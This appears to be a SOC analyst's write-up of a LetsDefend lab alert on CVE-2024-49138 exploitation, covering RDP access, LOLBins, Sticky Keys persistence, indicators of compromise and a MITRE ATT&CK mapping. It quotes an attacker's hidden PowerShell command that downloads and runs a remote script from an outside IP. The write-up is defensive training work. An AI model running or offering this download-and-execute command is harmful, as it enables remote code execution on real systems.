# 👨‍💻 LetsDefend Case Study #1: CVE-2024-49138 Exploitation (SOC335) — LOLBins, RDP and Sticky Keys Abuse

## 🚨 Incident Overview
This is the first case study from **LetsDefend**, where we investigate the exploitation of **CVE-2024-49138**. The incident was triggered due to suspicious behavior patterns indicating the possible exploitation of the vulnerability. The core of the exploitation involved **Remote Desktop Protocol (RDP)** access, **Living Off the Land Binaries (LOLbins)**, and abuse of the **Sticky Keys backdoor** technique for persistence.

### 🚨 Incident Details
- **Suspicious Process**: `svohost.exe` (suspiciously similar to `svchost.exe`, a common process targeted by attackers to disguise malicious processes)
- **Parent Process Path**: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- **Exploitation Trigger**: Unusual behavior patterns associated with the hash, suggesting a **CVE-2024-49138** exploitation attempt.

### 🚨 Key Investigation Findings
- The attacker used **PowerShell** to execute the following command:
    ```powershell
    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy Bypass -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://18.223.186.129:4444/MBS.ps1')
    ```
- **RDP Connection**: The attacker successfully connected to the host with IP `172.16.17.207` using **RDP** over Port `3389`.
- **Sticky Keys Abuse**: The attacker used the **Sticky Keys backdoor technique** as a persistence mechanism by replacing `sethc.exe` with the following command:
    ```powershell
    C:\Windows\System32\Sethc.exe /AccessibilitySoundAgent
    ```
- The attacker downloaded a ZIP file (`service-installer.zip`) and extracted it using the password **infected**, which contained the malware `svohost.exe`.
- A failed authentication attempt was made to gain **admin** access, which failed due to invalid credentials (`0xC000006D` error).

### 🚨 Attack Steps & Techniques
The attacker utilized the following techniques in line with the **MITRE ATT&CK framework**:

| **Step** | **Tactic** | **Technique** |
|----------|------------|---------------|
| 1. RDP login | Initial Access | T1133 |
| 2. PowerShell execution | Execution | T1059.001 |
| 3. Admin priv. check | Discovery / Priv. Esc | T1033 / T1068 |
| 4. Sticky Keys backdoor | Persistence | T1547.008 |
| 5. Defender bypass | Defense Evasion | T1562.001 |
| 6. Lateral RDP | Lateral Movement | T1021.001 |
| 7. Payload staging | Command & Control | T1105 |
| 8. Tool execution | Execution | T1059.001 |
| 9. LOLBin usage | Defense Evasion | T1218.001 |

### 🚨 Key Indicators of Compromise (IOCs)
- **Malicious Executable**: `svohost.exe`
- **External IP**: `185.107.56.141`
- **Malicious URL**: `http://18.223.186.129:4444/MBS.ps1`
- **Ports**: `3389` (RDP)
- **ZIP File Downloaded**: `service-installer.zip`
- **Password for ZIP**: `infected`

### 🚨 Why is this a Remote Code Execution (RCE)?
The attacker is executing code from a remote source (`MBS.ps1`), which constitutes a **Remote Code Execution (RCE)**, even though a local binary (e.g., **PowerShell**) is used to execute it.

### 🚨 Incident Response Actions
- **Containment**: The first step was containment of the affected host.
- **Mitigation**: Actions included identifying the attacker’s methods, stopping RDP access, disabling the Sticky Keys backdoor, and scanning for other potential IOCs.

---

## 📚 MITRE ATT&CK Mapping
This case study is closely related to several tactics and techniques outlined in the **MITRE ATT&CK framework**, and the incident can be mapped to the following:
- **Initial Access**: RDP login (T1133)
- **Execution**: PowerShell abuse (T1059.001)
- **Persistence**: Sticky Keys backdoor (T1547.008)
- **Defense Evasion**: PowerShell with `-ExecutionPolicy Bypass` (T1562.001)
- **Command and Control**: Payload staging (T1105)
- **Lateral Movement**: RDP lateral movement (T1021.001)
- **Credential Dumping**: Admin priv. check (T1033 / T1068)

---

## 🧪 Key Takeaways
This incident highlights the use of common, trusted system binaries (**PowerShell**, **Sticky Keys**) to bypass detection mechanisms and escalate privileges. Additionally, it emphasizes the importance of monitoring **RDP** access and securing system services to prevent lateral movement and persistence mechanisms.

---

## 💡 Conclusion
This case study provides a great example of the need for vigilance in detecting **RDP** abuse, **PowerShell** exploitation, and **local persistence techniques** like Sticky Keys. The attacker used **Living Off the Land Binaries (LOLbins)** and sophisticated **defense evasion** tactics to carry out the attack stealthily.

---

## 🔗 Links
- [LetsDefend Case Study #1](https://myitjourney12.wordpress.com/2025/04/15/letsdefend-case-1-soc335-cve-2024-49138-exploitation-detected-lolbin-and-rce/)
- [GitHub Repository](https://github.com/BNarlioglu/LetsDefend-Investigations)
